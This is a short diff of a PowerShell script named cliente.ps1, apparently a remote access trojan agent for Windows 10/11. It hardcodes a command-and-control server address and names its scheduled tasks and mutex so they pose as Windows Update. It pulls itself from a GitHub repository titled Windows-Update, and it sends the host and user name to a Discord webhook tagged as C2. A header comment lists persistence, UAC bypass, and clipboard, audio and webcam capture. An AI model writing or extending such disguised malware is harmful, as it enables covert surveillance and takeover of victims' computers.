@@ -1,4 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
+# Agent Completo: Webhook (Sem ping), Persistencia, UAC Bypass, Clipboard, Audio, Webcam
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -13,7 +14,7 @@ $taskBootName = "MicrosoftWindowsUpdateBoot_$h"
 $mutexName    = "Local\WinUpdateSvcMutex_$h"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-# Função para Log no Discord (Corrigida sem crases que quebram o script)
+# Função para Log no Discord (Corrigida sem crases)
 function Send-Webhook($msg) {
     try {
         $content = "[R9K C2] $env:COMPUTERNAME ($env:USERNAME) `n" + $msg
